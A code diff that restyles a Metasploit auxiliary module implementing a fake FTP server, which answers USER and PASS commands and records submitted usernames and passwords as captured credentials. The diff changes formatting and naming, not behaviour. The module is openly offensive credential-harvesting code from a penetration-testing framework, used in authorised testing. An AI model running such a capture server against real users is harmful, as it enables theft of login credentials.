@@ -9,29 +9,33 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'Authentication Capture: FTP',
-      'Description'    => %q{
+      'Name' => 'Authentication Capture: FTP',
+      'Description' => %q{
           This module provides a fake FTP service that
         is designed to capture authentication credentials.
       },
-      'Author'      => ['ddz', 'hdm'],
-      'License'     => MSF_LICENSE,
-      'Actions'     =>
-        [
-          [ 'Capture', 'Description' => 'Run FTP capture server' ]
-        ],
-      'PassiveActions' =>
-        [
-          'Capture'
-        ],
-      'DefaultAction'  => 'Capture'
+      'Author' => ['ddz', 'hdm'],
+      'License' => MSF_LICENSE,
+      'Actions' => [
+        [ 'Capture', { 'Description' => 'Run FTP capture server' } ]
+      ],
+      'PassiveActions' => [
+        'Capture'
+      ],
+      'DefaultAction' => 'Capture',
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [],
+        'Reliability' => []
+      }
     )
 
     register_options(
       [
-        OptPort.new('SRVPORT',  [ true, "The local port to listen on.", 21 ]),
-        OptString.new('BANNER', [ true, "The server banner",  'FTP Server Ready'])
-      ])
+        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 21 ]),
+        OptString.new('BANNER', [ true, 'The server banner', 'FTP Server Ready'])
+      ]
+    )
   end
 
   def setup
@@ -40,12 +44,12 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    exploit()
+    exploit
   end
 
-  def on_client_connect(c)
-    @state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
-    c.put "220 #{datastore['BANNER']}\r\n"
+  def on_client_connect(client)
+    @state[client] = { name: "#{client.peerhost}:#{client.peerport}", ip: client.peerhost, port: client.peerport, user: nil, pass: nil }
+    client.put "220 #{datastore['BANNER']}\r\n"
   end
 
   def report_cred(opts)
@@ -74,47 +78,46 @@ class MetasploitModule < Msf::Auxiliary
     create_credential_login(login_data)
   end
 
-  def on_client_data(c)
-    data = c.get_once
-    return if not data
-    cmd,arg = data.strip.split(/\s+/, 2)
-    arg ||= ""
+  def on_client_data(client)
+    data = client.get_once
+    return if !data
 
-    if(cmd.upcase == "USER")
-      @state[c][:user] = arg
-      c.put "331 User name okay, need password...\r\n"
+    cmd, arg = data.strip.split(/\s+/, 2)
+    arg ||= ''
+
+    if (cmd.upcase == 'USER')
+      @state[client][:user] = arg
+      client.put "331 User name okay, need password...\r\n"
       return
     end
 
-    if(cmd.upcase == "QUIT")
-      c.put "221 Logout\r\n"
+    if (cmd.upcase == 'QUIT')
+      client.put "221 Logout\r\n"
       return
     end
 
-    if(cmd.upcase == "PASS")
-      @state[c][:pass] = arg
+    if (cmd.upcase == 'PASS')
+      @state[client][:pass] = arg
 
       report_cred(
-        ip: @state[c][:ip],
+        ip: @state[client][:ip],
         port: datastore['SRVPORT'],
         service_name: 'ftp',
-        user: @state[c][:user],
-        password: @state[c][:pass],
+        user: @state[client][:user],
+        password: @state[client][:pass],
         proof: arg
       )
 
-      print_good("FTP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
+      print_good("FTP LOGIN #{@state[client][:name]} #{@state[client][:user]} / #{@state[client][:pass]}")
     end
 
-    @state[c][:pass] = data.strip
-    c.put "500 Error\r\n"
+    @state[client][:pass] = data.strip
+    client.put "500 Error\r\n"
     return
-
   end
 
-  def on_client_close(c)
-    @state.delete(c)
+  def on_client_close(client)
+    @state.delete(client)
   end
-
 
 end
